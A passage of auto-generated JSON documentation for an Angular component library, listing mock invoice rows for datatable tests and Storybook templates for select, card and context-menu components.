439009,\n    'total': 85163\n}, {\n    'invoiceNo': 203365491,\n    'voyageNo': 15574,\n    'vesselName': 'Arizona Whitefeather',\n    'allocated': 424981,\n    'total': 72976\n}, {\n    'invoiceNo': 258026382,\n    'voyageNo': 17991,\n    'vesselName': 'Rough Blackfoot',\n    'allocated': 412805,\n    'total': 525915\n}, {\n    'invoiceNo': 216800989,\n    'voyageNo': 18938,\n    'vesselName': 'Narrowleaf Wirelettuce',\n    'allocated': 437679,\n    'total': 384426\n}, {\n    'invoiceNo': 224161270,\n    'voyageNo': 15475,\n    'vesselName': 'Utah Sweetvetch',\n    'allocated': 414735,\n    'total': 398700\n}, {\n    'invoiceNo': 224587536,\n    'voyageNo': 16133,\n    'vesselName': 'Palau Horsfieldia',\n    'allocated': 409836,\n    'total': 55599\n}, {\n    'invoiceNo': 200019644,\n    'voyageNo': 16430,\n    'vesselName': 'Cracked Lichen',\n    'allocated': 491135,\n    'total': 400179\n}, {\n    'invoiceNo': 212973644,\n    'voyageNo': 16527,\n    'vesselName': 'California Valerian',\n    'allocated': 465742,\n    'total': 428281\n}, {\n    'invoiceNo': 236726871,\n    'voyageNo': 15145,\n    'vesselName': 'Spear Saltbush',\n    'allocated': 420067,\n    'total': 236753\n}, {\n    'invoiceNo': 262498296,\n    'voyageNo': 16350,\n    'vesselName': 'Rose Globemallow',\n    'allocated': 472387,\n    'total': 270655\n}, {\n    'invoiceNo': 237959767,\n    'voyageNo': 18739,\n    'vesselName': 'Cithara Buckwheat',\n    'allocated': 447466,\n    'total': 358262\n}, {\n    'invoiceNo': 200461954,\n    'voyageNo': 18921,\n    'vesselName': 'Rough Potato',\n    'allocated': 425594,\n    'total': 459497\n}, {\n    'invoiceNo': 266033549,\n    'voyageNo': 16150,\n    'vesselName': 'Distictis',\n    'allocated': 447636,\n    'total': 286350\n}, {\n    'invoiceNo': 289893009,\n    'voyageNo': 18219,\n    'vesselName': 'Piedmont False Pimpernel',\n    'allocated': 474098,\n    'total': 163688\n}, {\n    'invoiceNo': 241320630,\n    'voyageNo': 15558,\n    'vesselName': 'Southern Mexican Sage',\n    'allocated': 431537,\n    'total': 419734\n}, {\n    'invoiceNo': 211404482,\n    'voyageNo': 18502,\n    'vesselName': 'Bearded Sprangletop',\n    'allocated': 458939,\n    'total': 89714\n}, {\n    'invoiceNo': 247917426,\n    'voyageNo': 18238,\n    'vesselName': 'Small-flowered Calycadenia',\n    'allocated': 406198,\n    'total': 351785\n}, {\n    'invoiceNo': 234633032,\n    'voyageNo': 17269,\n    'vesselName': 'Pritchardia',\n    'allocated': 442188,\n    'total': 414638\n}, {\n    'invoiceNo': 216477974,\n    'voyageNo': 15454,\n    'vesselName': 'Thread Lichen',\n    'allocated': 474232,\n    'total': 537142\n}, {\n    'invoiceNo': 201667786,\n    'voyageNo': 15130,\n    'vesselName': 'Margined Stickseed',\n    'allocated': 493253,\n    'total': 364145\n}, {\n    'invoiceNo': 271891491,\n    'voyageNo': 15468,\n    'vesselName': 'Eggleaf Milkwort',\n    'allocated': 457747,\n    'total': 316780\n}, {\n    'invoiceNo': 223744528,\n    'voyageNo': 16074,\n    'vesselName': 'Hall\\'s Mule-ears',\n    'allocated': 439241,\n    'total': 301239\n}, {\n    'invoiceNo': 202936481,\n    'voyageNo': 18868,\n    'vesselName': 'Rinodina Lichen',\n    'allocated': 488291,\n    'total': 504547\n}, {\n    'invoiceNo': 284610720,\n    'voyageNo': 17077,\n    'vesselName': 'Saber Bogmat',\n    'allocated': 417817,\n    'total': 246511\n}, {\n    'invoiceNo': 286535852,\n    'voyageNo': 15935,\n    'vesselName': 'Brodiaea',\n    'allocated': 479989,\n    'total': 276206\n}, {\n    'invoiceNo': 206000446,\n    'voyageNo': 17528,\n    'vesselName': 'Utah Serviceberry',\n    'allocated': 454837,\n    'total': 399887\n}, {\n    'invoiceNo': 283036494,\n    'voyageNo': 16899,\n    'vesselName': 'Lehua Makanoe',\n    'allocated': 452547,\n    'total': 96023\n}, {\n    'invoiceNo': 270371913,\n    'voyageNo': 16886,\n    'vesselName': 'Rim Lichen',\n    'allocated': 439082,\n    'total': 269557\n}, {\n    'invoiceNo': 273513209,\n    'voyageNo': 15570,\n    'vesselName': 'Andrews\\' Rhizomnium Moss',\n    'allocated': 471494,\n    'total': 131750\n}, {\n    'invoiceNo': 215244773,\n    'voyageNo': 17618,\n    'vesselName': 'Lesser Pond Sedge',\n    'allocated': 472422,\n    'total': 505921\n}, {\n    'invoiceNo': 264815411,\n    'voyageNo': 17008,\n    'vesselName': 'Browne\\'s Savory',\n    'allocated': 464834,\n    'total': 420180\n}, {\n    'invoiceNo': 260793904,\n    'voyageNo': 18868,\n    'vesselName': 'Bastard Copperleaf',\n    'allocated': 403983,\n    'total': 190831\n}, {\n    'invoiceNo': 228919503,\n    'voyageNo': 16736,\n    'vesselName': 'Himalayan Cypress',\n    'allocated': 418664,\n    'total': 450233\n}, {\n    'invoiceNo': 225534860,\n    'voyageNo': 18374,\n    'vesselName': 'Fiddleleaf Hawksbeard',\n    'allocated': 495477,\n    'total': 528500\n}, {\n    'invoiceNo': 205039289,\n    'voyageNo': 15221,\n    'vesselName': 'Maui Cyanea',\n    'allocated': 434081,\n    'total': 79021\n}, {\n    'invoiceNo': 219730920,\n    'voyageNo': 18931,\n    'vesselName': 'Garden Sorrel',\n    'allocated': 442584,\n    'total': 193166\n}, {\n    'invoiceNo': 229994865,\n    'voyageNo': 16404,\n    'vesselName': 'Waialeale Dubautia',\n    'allocated': 414377,\n    'total': 195495\n}, {\n    'invoiceNo': 289807557,\n    'voyageNo': 16151,\n    'vesselName': 'Onetooth Woodfern',\n    'allocated': 415673,\n    'total': 202974\n}, {\n    'invoiceNo': 289750833,\n    'voyageNo': 15827,\n    'vesselName': 'Greenland Orange Lichen',\n    'allocated': 416432,\n    'total': 146021\n}, {\n    'invoiceNo': 243948439,\n    'voyageNo': 18154,\n    'vesselName': 'Leafy Reedgrass',\n    'allocated': 441439,\n    'total': 248631\n}, {\n    'invoiceNo': 266718010,\n    'voyageNo': 15322,\n    'vesselName': 'Largeleaf Marshpennywort',\n    'allocated': 436736,\n    'total': 256997\n}, {\n    'invoiceNo': 285338933,\n    'voyageNo': 18884,\n    'vesselName': 'Musk Okra',\n    'allocated': 414918,\n    'total': 475276\n}, {\n    'invoiceNo': 284544908,\n    'voyageNo': 16825,\n    'vesselName': 'Stegonia Moss',\n    'allocated': 486396,\n    'total': 210718\n}, {\n    'invoiceNo': 200951860,\n    'voyageNo': 15681,\n    'vesselName': 'Black Rock Townsend Daisy',\n    'allocated': 437133,\n    'total': 358340\n}, {\n    'invoiceNo': 248838992,\n    'voyageNo': 18254,\n    'vesselName': 'Kern Canyon Clarkia',\n    'allocated': 414245,\n    'total': 164454\n}, {\n    'invoiceNo': 274109340,\n    'voyageNo': 18252,\n    'vesselName': 'Squarrose Knapweed',\n    'allocated': 408814,\n    'total': 159690\n}, {\n    'invoiceNo': 219721177,\n    'voyageNo': 16331,\n    'vesselName': 'Lake County Dwarf-flax',\n    'allocated': 496150,\n    'total': 404922\n}, {\n    'invoiceNo': 272212685,\n    'voyageNo': 15395,\n    'vesselName': 'Ferngrass',\n    'allocated': 432853,\n    'total': 191127\n}, {\n    'invoiceNo': 243182762,\n    'voyageNo': 18321,\n    'vesselName': 'Marsh Grass',\n    'allocated': 462472,\n    'total': 452940\n}, {\n    'invoiceNo': 277839539,\n    'voyageNo': 17421,\n    'vesselName': 'Prairie Straw Sedge',\n    'allocated': 406837,\n    'total': 271284\n}, {\n    'invoiceNo': 207952597,\n    'voyageNo': 17197,\n    'vesselName': 'Doublehorn Calicoflower',\n    'allocated': 477735,\n    'total': 400959\n}, {\n    'invoiceNo': 260636315,\n    'voyageNo': 15453,\n    'vesselName': 'Palmer\\'s Goldenrod',\n    'allocated': 450419,\n    'total': 309897\n}, {\n    'invoiceNo': 256449906,\n    'voyageNo': 15189,\n    'vesselName': 'Oregon Checkerbloom',\n    'allocated': 435139,\n    'total': 139814\n}, {\n    'invoiceNo': 230023430,\n    'voyageNo': 15665,\n    'vesselName': 'Duckweed',\n    'allocated': 449282,\n    'total': 209512\n}, {\n    'invoiceNo': 226217229,\n    'voyageNo': 18462,\n    'vesselName': 'Disc Lichen',\n    'allocated': 471214,\n    'total': 58962\n}, {\n    'invoiceNo': 239201753,\n    'voyageNo': 18676,\n    'vesselName': 'Antifever Fontinalis Moss',\n    'allocated': 456585,\n    'total': 146024\n}, {\n    'invoiceNo': 235303844,\n    'voyageNo': 16223,\n    'vesselName': 'Miracle Fruit',\n    'allocated': 467877,\n    'total': 150931\n}, {\n    'invoiceNo': 217943418,\n    'voyageNo': 15418,\n    'vesselName': 'Little Gumweed',\n    'allocated': 494402,\n    'total': 355363\n}, {\n    'invoiceNo': 289788898,\n    'voyageNo': 15038,\n    'vesselName': 'Parish\\'s Oxytheca',\n    'allocated': 464853,\n    'total': 472823\n}, {\n    'invoiceNo': 280499130,\n    'voyageNo': 18914,\n    'vesselName': 'Jelly Lichen',\n    'allocated': 486477,\n    'total': 522679\n}, {\n    'invoiceNo': 223812339,\n    'voyageNo': 18298,\n    'vesselName': 'Evermann\\'s Fleabane',\n    'allocated': 453418,\n    'total': 50034\n}, {\n    'invoiceNo': 226331833,\n    'voyageNo': 17046,\n    'vesselName': 'Munj Sweetcane',\n    'allocated': 442239,\n    'total': 447072\n}, {\n    'invoiceNo': 226842057,\n    'voyageNo': 16491,\n    'vesselName': 'Trichostomum Moss',\n    'allocated': 450732,\n    'total': 471203\n}, {\n    'invoiceNo': 218377093,\n    'voyageNo': 18157,\n    'vesselName': 'Brown Stringybark',\n    'allocated': 441668,\n    'total': 464837\n}, {\n    'invoiceNo': 282690677,\n    'voyageNo': 16864,\n    'vesselName': 'Whorled Milkwort',\n    'allocated': 424456,\n    'total': 241177\n  }]\n  .map(row => ({...row, total: pipe.transform(row.total)}))"
      },
      {
        "name": "rows",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/testing/utils.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  {\n    invoiceNo: 212666588,\n    voyageNo: 16206,\n    vesselName: 'False Cloak Fern',\n    allocated: 486958,\n    total: 367817\n  }, {\n    invoiceNo: 209381561,\n    voyageNo: 16897,\n    vesselName: 'Weak Signalgrass',\n    allocated: 435757,\n    total: 306822\n  }, {\n    invoiceNo: 276445387,\n    voyageNo: 16723,\n    vesselName: 'Southern Red Oak',\n    allocated: 434782,\n    total: 304761\n  }, {\n    invoiceNo: 240525031,\n    voyageNo: 17412,\n    vesselName: 'Hollyleaf Buckthorn',\n    allocated: 498118,\n    total: 518295\n  }, {\n    invoiceNo: 208251845,\n    voyageNo: 15732,\n    vesselName: 'Western Sandparsley',\n    allocated: 483548,\n    total: 409397\n  }, {\n    invoiceNo: 244864110,\n    voyageNo: 15313,\n    vesselName: 'Kern Buckwheat',\n    allocated: 413287,\n    total: 374936\n  }, {\n    invoiceNo: 213639557,\n    voyageNo: 17502,\n    vesselName: 'Greenleaf Manzanita',\n    allocated: 478124,\n    total: 362754\n  }, {\n    invoiceNo: 255930079,\n    voyageNo: 15029,\n    vesselName: 'Blue Skullcap',\n    allocated: 464448,\n    total: 483236\n  }, {\n    invoiceNo: 204028785,\n    voyageNo: 17325,\n    vesselName: 'Coca',\n    allocated: 412084,\n    total: 319574\n  }, {\n    invoiceNo: 215898267,\n    voyageNo: 17556,\n    vesselName: 'Fendler\\'s Pennycress',\n    allocated: 467666,\n    total: 401105\n  }, {\n    invoiceNo: 283652560,\n    voyageNo: 16693,\n    vesselName: 'Densespike Blazing Star',\n    allocated: 428117,\n    total: 422318\n  }, {\n    invoiceNo: 261627486,\n    voyageNo: 16742,\n    vesselName: 'Texas Crab Apple',\n    allocated: 445829,\n    total: 389401\n  }, {\n    invoiceNo: 224657257,\n    voyageNo: 17344,\n    vesselName: 'Philodendron',\n    allocated: 439503,\n    total: 197357\n  }, {\n    invoiceNo: 287799672,\n    voyageNo: 18559,\n    vesselName: 'Knife Acacia',\n    allocated: 457225,\n    total: 152586\n  }, {\n    invoiceNo: 249855102,\n    voyageNo: 17210,\n    vesselName: 'Catnip Noseburn',\n    allocated: 490793,\n    total: 295054\n  }, {\n    invoiceNo: 217932979,\n    voyageNo: 18294,\n    vesselName: 'Brickellbush Goldenweed',\n    allocated: 476987,\n    total: 90357\n  }, {\n    invoiceNo: 287187542,\n    voyageNo: 18123,\n    vesselName: 'Threecornerjack',\n    allocated: 436103,\n    total: 98431\n  }, {\n    invoiceNo: 277359566,\n    voyageNo: 17549,\n    vesselName: 'Longleaf Isodendrion',\n    allocated: 456456,\n    total: 292117\n  }, {\n    invoiceNo: 250935681,\n    voyageNo: 16429,\n    vesselName: 'Purple False Gilyflower',\n    allocated: 465653,\n    total: 396830\n  }, {\n    invoiceNo: 261927204,\n    voyageNo: 16524,\n    vesselName: 'Nevada Pea',\n    allocated: 411190,\n    total: 393332\n  }, {\n    invoiceNo: 203826163,\n    voyageNo: 17608,\n    vesselName: 'Alaska Tall Bluebells',\n    allocated: 487745,\n    total: 273514\n  }, {\n    invoiceNo: 253006185,\n    voyageNo: 17795,\n    vesselName: 'Cupped Monolopia',\n    allocated: 491265,\n    total: 117277\n  }, {\n    invoiceNo: 212369622,\n    voyageNo: 17867,\n    vesselName: 'Small Rocklettuce',\n    allocated: 408880,\n    total: 530690\n  }, {\n    invoiceNo: 259555515,\n    voyageNo: 16488,\n    vesselName: 'Torchwood',\n    allocated: 428843,\n    total: 63208\n  }, {\n    invoiceNo: 209064476,\n    voyageNo: 17957,\n    vesselName: 'Saline Saltbush',\n    allocated: 452602,\n    total: 144560\n  }, {\n    invoiceNo: 246761266,\n    voyageNo: 18253,\n    vesselName: 'White Snakeroot',\n    allocated: 485075,\n    total: 133101\n  }, {\n    invoiceNo: 277989052,\n    voyageNo: 15535,\n    vesselName: 'Bayberry',\n    allocated: 411595,\n    total: 549473\n  }, {\n    invoiceNo: 246327302,\n    voyageNo: 17427,\n    vesselName: 'China Violet',\n    allocated: 426753,\n    total: 406017\n  }, {\n    invoiceNo: 225951335,\n    voyageNo: 15473,\n    vesselName: 'Olympic Saxifrage',\n    allocated: 429650,\n    total: 413380\n  }, {\n    invoiceNo: 206579573,\n    voyageNo: 17600,\n    vesselName: 'False Sun-rose',\n    allocated: 464983,\n    total: 474611\n  }, {\n    invoiceNo: 243806520,\n    voyageNo: 15148,\n    vesselName: 'Bracted Lousewort',\n    allocated: 486907,\n    total: 419416\n  }, {\n    invoiceNo: 248037555,\n    voyageNo: 16554,\n    vesselName: 'Beach Strawberry',\n    allocated: 446762,\n    total: 543982\n  }, {\n    invoiceNo: 233807782,\n    voyageNo: 18251,\n    vesselName: 'Western Bog Yellowcress',\n    allocated: 485749,\n    total: 206612\n  }, {\n    invoiceNo: 231399318,\n    voyageNo: 18647,\n    vesselName: 'Nevada Pea',\n    allocated: 416624,\n    total: 73797\n  }, {\n    invoiceNo: 210265421,\n    voyageNo: 17334,\n    vesselName: 'Silver Bird\\'s-foot Trefoil',\n    allocated: 493556,\n    total: 485404\n  }, {\n    invoiceNo: 270110020,\n    voyageNo: 15750,\n    vesselName: 'Dotted Lancepod',\n    allocated: 439009,\n    total: 85163\n  }, {\n    invoiceNo: 203365491,\n    voyageNo: 15574,\n    vesselName: 'Arizona Whitefeather',\n    allocated: 424981,\n    total: 72976\n  }, {\n    invoiceNo: 258026382,\n    voyageNo: 17991,\n    vesselName: 'Rough Blackfoot',\n    allocated: 412805,\n    total: 525915\n  }, {\n    invoiceNo: 216800989,\n    voyageNo: 18938,\n    vesselName: 'Narrowleaf Wirelettuce',\n    allocated: 437679,\n    total: 384426\n  }, {\n    invoiceNo: 224161270,\n    voyageNo: 15475,\n    vesselName: 'Utah Sweetvetch',\n    allocated: 414735,\n    total: 398700\n  }, {\n    invoiceNo: 224587536,\n    voyageNo: 16133,\n    vesselName: 'Palau Horsfieldia',\n    allocated: 409836,\n    total: 55599\n  }, {\n    invoiceNo: 200019644,\n    voyageNo: 16430,\n    vesselName: 'Cracked Lichen',\n    allocated: 491135,\n    total: 400179\n  }, {\n    invoiceNo: 212973644,\n    voyageNo: 16527,\n    vesselName: 'California Valerian',\n    allocated: 465742,\n    total: 428281\n  }, {\n    invoiceNo: 236726871,\n    voyageNo: 15145,\n    vesselName: 'Spear Saltbush',\n    allocated: 420067,\n    total: 236753\n  }, {\n    invoiceNo: 262498296,\n    voyageNo: 16350,\n    vesselName: 'Rose Globemallow',\n    allocated: 472387,\n    total: 270655\n  }, {\n    invoiceNo: 237959767,\n    voyageNo: 18739,\n    vesselName: 'Cithara Buckwheat',\n    allocated: 447466,\n    total: 358262\n  }, {\n    invoiceNo: 200461954,\n    voyageNo: 18921,\n    vesselName: 'Rough Potato',\n    allocated: 425594,\n    total: 459497\n  }, {\n    invoiceNo: 266033549,\n    voyageNo: 16150,\n    vesselName: 'Distictis',\n    allocated: 447636,\n    total: 286350\n  }, {\n    invoiceNo: 289893009,\n    voyageNo: 18219,\n    vesselName: 'Piedmont False Pimpernel',\n    allocated: 474098,\n    total: 163688\n  }, {\n    invoiceNo: 241320630,\n    voyageNo: 15558,\n    vesselName: 'Southern Mexican Sage',\n    allocated: 431537,\n    total: 419734\n  }, {\n    invoiceNo: 211404482,\n    voyageNo: 18502,\n    vesselName: 'Bearded Sprangletop',\n    allocated: 458939,\n    total: 89714\n  }, {\n    invoiceNo: 247917426,\n    voyageNo: 18238,\n    vesselName: 'Small-flowered Calycadenia',\n    allocated: 406198,\n    total: 351785\n  }, {\n    invoiceNo: 234633032,\n    voyageNo: 17269,\n    vesselName: 'Pritchardia',\n    allocated: 442188,\n    total: 414638\n  }, {\n    invoiceNo: 216477974,\n    voyageNo: 15454,\n    vesselName: 'Thread Lichen',\n    allocated: 474232,\n    total: 537142\n  }, {\n    invoiceNo: 201667786,\n    voyageNo: 15130,\n    vesselName: 'Margined Stickseed',\n    allocated: 493253,\n    total: 364145\n  }, {\n    invoiceNo: 271891491,\n    voyageNo: 15468,\n    vesselName: 'Eggleaf Milkwort',\n    allocated: 457747,\n    total: 316780\n  }, {\n    invoiceNo: 223744528,\n    voyageNo: 16074,\n    vesselName: 'Hall\\'s Mule-ears',\n    allocated: 439241,\n    total: 301239\n  }, {\n    invoiceNo: 202936481,\n    voyageNo: 18868,\n    vesselName: 'Rinodina Lichen',\n    allocated: 488291,\n    total: 504547\n  }, {\n    invoiceNo: 284610720,\n    voyageNo: 17077,\n    vesselName: 'Saber Bogmat',\n    allocated: 417817,\n    total: 246511\n  }, {\n    invoiceNo: 286535852,\n    voyageNo: 15935,\n    vesselName: 'Brodiaea',\n    allocated: 479989,\n    total: 276206\n  }, {\n    invoiceNo: 206000446,\n    voyageNo: 17528,\n    vesselName: 'Utah Serviceberry',\n    allocated: 454837,\n    total: 399887\n  }, {\n    invoiceNo: 283036494,\n    voyageNo: 16899,\n    vesselName: 'Lehua Makanoe',\n    allocated: 452547,\n    total: 96023\n  }, {\n    invoiceNo: 270371913,\n    voyageNo: 16886,\n    vesselName: 'Rim Lichen',\n    allocated: 439082,\n    total: 269557\n  }, {\n    invoiceNo: 273513209,\n    voyageNo: 15570,\n    vesselName: 'Andrews\\' Rhizomnium Moss',\n    allocated: 471494,\n    total: 131750\n  }, {\n    invoiceNo: 215244773,\n    voyageNo: 17618,\n    vesselName: 'Lesser Pond Sedge',\n    allocated: 472422,\n    total: 505921\n  }, {\n    invoiceNo: 264815411,\n    voyageNo: 17008,\n    vesselName: 'Browne\\'s Savory',\n    allocated: 464834,\n    total: 420180\n  }, {\n    invoiceNo: 260793904,\n    voyageNo: 18868,\n    vesselName: 'Bastard Copperleaf',\n    allocated: 403983,\n    total: 190831\n  }, {\n    invoiceNo: 228919503,\n    voyageNo: 16736,\n    vesselName: 'Himalayan Cypress',\n    allocated: 418664,\n    total: 450233\n  }, {\n    invoiceNo: 225534860,\n    voyageNo: 18374,\n    vesselName: 'Fiddleleaf Hawksbeard',\n    allocated: 495477,\n    total: 528500\n  }, {\n    invoiceNo: 205039289,\n    voyageNo: 15221,\n    vesselName: 'Maui Cyanea',\n    allocated: 434081,\n    total: 79021\n  }, {\n    invoiceNo: 219730920,\n    voyageNo: 18931,\n    vesselName: 'Garden Sorrel',\n    allocated: 442584,\n    total: 193166\n  }, {\n    invoiceNo: 229994865,\n    voyageNo: 16404,\n    vesselName: 'Waialeale Dubautia',\n    allocated: 414377,\n    total: 195495\n  }, {\n    invoiceNo: 289807557,\n    voyageNo: 16151,\n    vesselName: 'Onetooth Woodfern',\n    allocated: 415673,\n    total: 202974\n  }, {\n    invoiceNo: 289750833,\n    voyageNo: 15827,\n    vesselName: 'Greenland Orange Lichen',\n    allocated: 416432,\n    total: 146021\n  }, {\n    invoiceNo: 243948439,\n    voyageNo: 18154,\n    vesselName: 'Leafy Reedgrass',\n    allocated: 441439,\n    total: 248631\n  }, {\n    invoiceNo: 266718010,\n    voyageNo: 15322,\n    vesselName: 'Largeleaf Marshpennywort',\n    allocated: 436736,\n    total: 256997\n  }, {\n    invoiceNo: 285338933,\n    voyageNo: 18884,\n    vesselName: 'Musk Okra',\n    allocated: 414918,\n    total: 475276\n  }, {\n    invoiceNo: 284544908,\n    voyageNo: 16825,\n    vesselName: 'Stegonia Moss',\n    allocated: 486396,\n    total: 210718\n  }, {\n    invoiceNo: 200951860,\n    voyageNo: 15681,\n    vesselName: 'Black Rock Townsend Daisy',\n    allocated: 437133,\n    total: 358340\n  }, {\n    invoiceNo: 248838992,\n    voyageNo: 18254,\n    vesselName: 'Kern Canyon Clarkia',\n    allocated: 414245,\n    total: 164454\n  }, {\n    invoiceNo: 274109340,\n    voyageNo: 18252,\n    vesselName: 'Squarrose Knapweed',\n    allocated: 408814,\n    total: 159690\n  }, {\n    invoiceNo: 219721177,\n    voyageNo: 16331,\n    vesselName: 'Lake County Dwarf-flax',\n    allocated: 496150,\n    total: 404922\n  }, {\n    invoiceNo: 272212685,\n    voyageNo: 15395,\n    vesselName: 'Ferngrass',\n    allocated: 432853,\n    total: 191127\n  }, {\n    invoiceNo: 243182762,\n    voyageNo: 18321,\n    vesselName: 'Marsh Grass',\n    allocated: 462472,\n    total: 452940\n  }, {\n    invoiceNo: 277839539,\n    voyageNo: 17421,\n    vesselName: 'Prairie Straw Sedge',\n    allocated: 406837,\n    total: 271284\n  }, {\n    invoiceNo: 207952597,\n    voyageNo: 17197,\n    vesselName: 'Doublehorn Calicoflower',\n    allocated: 477735,\n    total: 400959\n  }, {\n    invoiceNo: 260636315,\n    voyageNo: 15453,\n    vesselName: 'Palmer\\'s Goldenrod',\n    allocated: 450419,\n    total: 309897\n  }, {\n    invoiceNo: 256449906,\n    voyageNo: 15189,\n    vesselName: 'Oregon Checkerbloom',\n    allocated: 435139,\n    total: 139814\n  }, {\n    invoiceNo: 230023430,\n    voyageNo: 15665,\n    vesselName: 'Duckweed',\n    allocated: 449282,\n    total: 209512\n  }, {\n    invoiceNo: 226217229,\n    voyageNo: 18462,\n    vesselName: 'Disc Lichen',\n    allocated: 471214,\n    total: 58962\n  }, {\n    invoiceNo: 239201753,\n    voyageNo: 18676,\n    vesselName: 'Antifever Fontinalis Moss',\n    allocated: 456585,\n    total: 146024\n  }, {\n    invoiceNo: 235303844,\n    voyageNo: 16223,\n    vesselName: 'Miracle Fruit',\n    allocated: 467877,\n    total: 150931\n  }, {\n    invoiceNo: 217943418,\n    voyageNo: 15418,\n    vesselName: 'Little Gumweed',\n    allocated: 494402,\n    total: 355363\n  }, {\n    invoiceNo: 289788898,\n    voyageNo: 15038,\n    vesselName: 'Parish\\'s Oxytheca',\n    allocated: 464853,\n    total: 472823\n  }, {\n    invoiceNo: 280499130,\n    voyageNo: 18914,\n    vesselName: 'Jelly Lichen',\n    allocated: 486477,\n    total: 522679\n  }, {\n    invoiceNo: 223812339,\n    voyageNo: 18298,\n    vesselName: 'Evermann\\'s Fleabane',\n    allocated: 453418,\n    total: 50034\n  }, {\n    invoiceNo: 226331833,\n    voyageNo: 17046,\n    vesselName: 'Munj Sweetcane',\n    allocated: 442239,\n    total: 447072\n  }, {\n    invoiceNo: 226842057,\n    voyageNo: 16491,\n    vesselName: 'Trichostomum Moss',\n    allocated: 450732,\n    total: 471203\n  }, {\n    invoiceNo: 218377093,\n    voyageNo: 18157,\n    vesselName: 'Brown Stringybark',\n    allocated: 441668,\n    total: 464837\n  }, {\n    invoiceNo: 282690677,\n    voyageNo: 16864,\n    vesselName: 'Whorled Milkwort',\n    allocated: 424456,\n    total: 241177\n  } ]"
      },
      {
        "name": "scss",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/copy-assets.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "path.join(src, 'style/**/*')"
      },
      {
        "name": "SelectAllMulti",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<any>",
        "defaultValue": "(args) => ( {\n  props: {\n    selected: [ 1, 2 ],\n    isFilter: true,\n    focusIfNoValue: false,\n    items,\n    total: items.length,\n    valueChange: (event: any) => console.log(event),\n    ctrl: new UntypedFormControl([ 1, 2 ])\n  }, template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n  <mat-form-field stoFormField\n                  floatLabel=\"always\" >\n    <mat-label>Multiselect with filter</mat-label>\n    <mat-select [multiple]=\"true\"\n    [formControl]=\"ctrl\"\n                (selectionChange)=\"valueChange($event)\"\n                [value]=\"selected\">\n      <sto-option-select-all></sto-option-select-all>\n      <mat-option *ngFor=\"let opt of items\"\n                  [value]=\"opt.id\">{{opt.name}}</mat-option>\n    </mat-select>\n  </mat-form-field>\n</mat-card>`\n} )"
      },
      {
        "name": "SingleSelect",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Record<string, >>",
        "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n    <mat-form-field  class=\"sto-form__field\" floatLabel=\"always\">\n    <mat-label>Select with filter</mat-label>\n      <mat-select [multiple]=\"false\" [value]=\"selected\">\n        <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                           [isFilter]=\"isFilter\"\n                           [focusIfNoValue]=\"focusIfNoValue\"\n                           [isMulti]=\"false\"\n                           (valueChanges)=\"filteredItems = filter($event, allItems)\"></sto-select-filter>\n        <mat-option *ngFor=\"let opt of filteredItems\"\n                    [value]=\"opt\">{{opt.name}}</mat-option>\n      </mat-select>\n    </mat-form-field>\n</mat-card>`\n} )"
      },
      {
        "name": "src",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/copy-assets.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "path.join(root, 'libs', 'core', 'src')"
      },
      {
        "name": "StoCard",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/lib/styles.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<literal type>",
        "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<mat-card [class.sto-card]=\"withStyles\">\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\n</mat-card>`\n} )"
      },
      {
        "name": "StoContextMenu",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "() => ( {\n  props: {\n    closed: action('Menu closed'),\n    log: action('Active menu info')\n  },\n  template: `<mat-card>\n<mat-card-title>Context menu</mat-card-title>\n  <button\n#overlay=\"stoMenuOverlay\"\n[matMenuTriggerRestoreFocus]=\"false\"\n(menuClosed)=\"closed()\"\nmat-button stoMenuOverlay #trigger=\"matMenuTrigger\" [matMenuTriggerFor]=\"menu\">Menu trigger button</button>\n<br>\n<br>\n<p>\n  Active Menu Index {{ activeMenuInfo }}\n</p>\n<br>\n<br>\n<div style=\"width: 500px; display: flex; justify-content: space-between\">\n<span [menuContext]=\"{index: 0}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 0</span>\n<span [menuContext]=\"{index: 1}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 1</span>\n<span [menuContext]=\"{index: 2}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 2</span>\n<span [menuContext]=\"{index: 3}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 3</span>\n</div>\n\n<mat-menu [backdropClass]=\"'backdrop-remove'\" [hasBackdrop]=\"false\" #menu=\"matMenu\">\n  <ng-template matMenuContent let-index=\"index\">\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log('index', index, $event)\">Index {{ index }}</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(1, $event)\">Item 1</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(2, $event)\">Item 2</button>\n  </ng-template>\n</mat-menu>\n</mat-card>`\n} )"
      },
      {
        "name": "StoDialog",
        "ctype": "miscellaneous",
        "subtype": "variable",
